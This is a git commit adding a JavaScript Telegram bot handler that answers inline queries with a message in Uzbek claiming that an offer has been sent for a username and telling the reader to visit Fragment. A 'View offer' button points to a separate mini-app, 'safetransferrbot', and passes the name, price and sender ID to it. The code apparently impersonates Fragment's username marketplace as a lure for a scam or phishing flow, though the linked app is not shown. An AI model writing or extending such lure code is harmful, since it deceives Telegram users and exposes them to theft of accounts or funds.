9faa876ddca3906b6f44dab7a7d96ce64ba129e9
Safed <sindarovsardor9@gmail.com>
2025-09-02 18:34:27 +0500

    first commit

---
+++ src/bot/core/events.js
@@ -0,0 +1,36 @@
+const bot = require("./bot");
+
+bot.on("inline_query", (query) => {
+
+    const text = query.query;
+
+    if (!/^[A-Za-z]+-(?:[1-9]\d|[1-9]\d{2,3}|10000)$/.test(text)) return;
+
+    const match = text.match(/^([A-Za-z]+)-(\d+)$/);
+    const name = match[1]
+    const price = match[2];
+
+    const params = btoa(JSON.stringify({ name, price, chatId: query.from.id }));
+    const message = `@${name} username uchun taklif yuborildi! Tafsilotlarni ko'rish uchun Fragment-ga tashrif buyuring:`
+
+    const results = [
+        {
+            type: "article",
+            id: "1",
+            title: message,
+            input_message_content: {
+                message_text: message,
+            },
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "Taklifni ko'rish", url: "https://t.me/safetransferrbot/transfer?startapp=" + params },
+                    ],
+                ],
+            }
+        },
+    ];
+    bot.answerInlineQuery(query.id, results, { cache_time: 0 });
+});
+
+module.exports = bot;
